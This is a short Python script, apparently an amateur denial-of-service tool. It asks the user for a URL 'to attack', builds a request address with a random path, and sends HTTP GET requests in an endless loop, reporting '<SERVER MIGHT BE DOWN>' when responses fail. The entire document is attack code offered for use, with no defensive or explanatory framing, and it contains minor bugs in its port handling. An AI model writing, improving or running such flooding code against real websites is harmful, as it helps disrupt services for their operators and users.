import requests
import random

def ran():
    randint = str(random.randint(1, 500))
    return randint
ran1 = ran()
port = 80
website = input('ENTER A URL TO ATTACK! ')
port = input('IN WICH PORT YOU (DIFFAULT IS 80) ')
if not 'https://' in website:
    website = f'http://{website}:{port}/{ran1}'
    print(website)

try:
    r = requests.get(website)
except ValueError:
    print('<MAKE SURE YOU WROTE THE URL CORRECT BEACUSE SOME THING WENT WRONG!>')

while True:
    print('if you want to stop press Ctrl + c')
    r = requests.get(website)
    if r.status_code != 200:
        print('<SERVER MIGHT BE DOWN>')